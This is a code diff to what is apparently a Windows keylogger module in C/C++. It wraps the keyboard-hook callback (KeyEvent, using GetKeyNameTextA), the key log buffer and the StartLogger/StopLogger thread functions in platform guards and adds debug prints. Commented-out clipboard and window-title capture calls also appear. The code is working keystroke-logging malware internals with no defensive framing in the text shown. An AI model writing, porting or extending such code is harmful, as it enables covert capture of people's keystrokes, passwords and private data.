@@ -1,4 +1,4 @@
-#include <Windows.h>
+#include "WindowsCompat.h"
 #include <stdio.h>
 #include <mutex>
 
@@ -55,6 +55,7 @@ char easytolower(char in) {
 
 bool shiftModifier = false;
 
+#ifdef __WIN32
 __declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	char szKey[256]; DWORD dwMsg; int i;
@@ -73,7 +74,7 @@ __declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM
 		i = GetKeyNameTextA(dwMsg, szKey, sizeof(szKey));
 #ifdef _DEBUG_
 		printf("%s - VK: %d , SC: %d (length: %d)\n", szKey, kbHook.vkCode, kbHook.scanCode, i);
-#endif 
+#endif
 		//getClipBoard(); //we don't need this shit for now do we?no
 		//getWindowTitle();
 
@@ -145,23 +146,32 @@ DWORD WINAPI StartLoggerInvoker(LPVOID lpParameter) {
 	MsgLoop();
 	return 0;
 }
+#endif
 
 bool StartLogger() {
+#ifdef __WIN32
 	if (KeylogBuffer == 0) KeylogBuffer = (char*)malloc(KEYLOG_BUFFER_SIZE);
 	if (isLogging) return true;
 	HINSTANCE hExe = GetModuleHandle(NULL);
 	if (!hExe) return 1;
 
 	CreateThread(NULL, NULL, StartLoggerInvoker, (LPVOID)hExe, NULL, NULL);
-
+#endif
+#ifdef _DEBUG_
+	printf("[+] StartLogger().\n");
+#endif
 	isLogging = true;
 	return isLogging;
 }
 
 bool StopLogger() {
+#ifdef _DEBUG_
+	printf("[+] StopLogger().\n");
+#endif
+
 	if (!isLogging) return true;
-
+#ifdef __WIN32
 	isLogging = !UnhookWindowsHookEx(hKeyHook);
-
+#endif
 	return !isLogging;
 }
